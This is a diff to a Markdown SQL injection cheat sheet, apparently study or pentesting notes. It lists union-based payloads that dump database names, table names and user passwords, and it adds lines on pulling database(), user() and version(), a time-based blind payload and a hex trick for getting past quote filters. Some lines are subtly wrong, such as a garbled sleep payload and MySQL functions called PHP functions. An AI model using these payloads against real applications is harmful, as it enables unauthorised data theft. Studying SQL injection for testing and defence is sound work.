@@ -46,6 +46,7 @@ See a more detailed [explanation about SQL injection](sql-injection.md).
 
 # 4. Get names of all databases 
 1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#
+
 # 5. Get names of all tables from the selected database
 1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 
 
@@ -56,8 +57,24 @@ See a more detailed [explanation about SQL injection](sql-injection.md).
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
 ```
 
+Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:
+
+```
+database()
+user()
+version()
+```
+
+And here an example of how to retrieve them:
+
+```
+# if injectable columns are number 2, 3 and 4
+union select 1, database(),user(),version(),5
+```
+
+
 ### Manual SQLi Blind attack
-          
+
 user() returns the name of the user currently using the database.
 substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
 
@@ -66,3 +83,8 @@ substring() returns a substring of the given argument. It takes three parameters
 ' OR substring(user(), 1, 1) = 'b
 1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
 ```
+
+
+### Extra Bonus: Bypassing quotation marks
+
+Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.
